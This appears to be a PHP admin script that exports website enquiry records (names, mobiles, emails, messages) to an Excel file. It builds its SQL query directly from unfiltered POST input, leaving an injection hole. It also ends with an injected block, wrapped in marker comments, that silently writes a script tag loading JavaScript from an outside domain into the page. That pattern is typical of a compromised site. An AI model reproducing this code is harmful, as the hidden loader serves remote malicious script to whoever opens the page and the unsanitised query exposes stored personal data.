<?php
		include "inc/session_check.php";
		$con1 = "";
		$con2 = "";
		$con3 = "";
		
	if(isset($_POST['name']) && $_POST['name']!='')
	{
		$con1 = " and name like '%$_POST[name]%'";
	}
	if($_POST['from_date'] != '')
	{
	$fdate =  $_POST['from_date'];
	$con2 = "and en_date >=  '$fdate'";	
	}
  	if($_POST['to_date'] != '')
	{
	$tdate =  $_POST['to_date'];
	$con3 = "and en_date <=  '$tdate'";	
	}
		
	
$select = "select name as Name, location as Location, mobile as Mobile, email as Email, purpose as Purpose, message as Message, en_date as Date from sd_enquiry where 1 $con1 $con2 $con3 order by id desc";
	

$export = mysql_query($select) or die("Sql error : " . mysql_error());

$fields = mysql_num_fields($export);
$header = "";
$data = "";
for($i = 0; $i < $fields; $i++)
{
    $header .= mysql_field_name($export , $i). "\t";
}

while($row = mysql_fetch_row($export))
{
    $line = '';
    foreach($row as $value)
    {                                            
        if(!isset($value) || trim($value) == "")
        {
            $value = "\t";
        }
        else
        {
            $value = str_replace('"' , '""' , $value);
            $value = '"' . $value . '"' . "\t";
        }
        $line .= $value;
    }
    $data .= trim($line). "\n";
}
$data = str_replace("\r" , "" , $data);

if(trim($data) == "")
{
    $data = "\n(0)Records Found!\n";                        
}

header("Content-type: application/msexcel");
header("Content-Disposition: attachment; filename=Enquiry.xls");
header("Pragma: no-cache");
header("Expires: 0");
print "$header\n$data";

?>
<?php
#054009#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967008\"></script>";
echo $g;
}
#/054009#
?>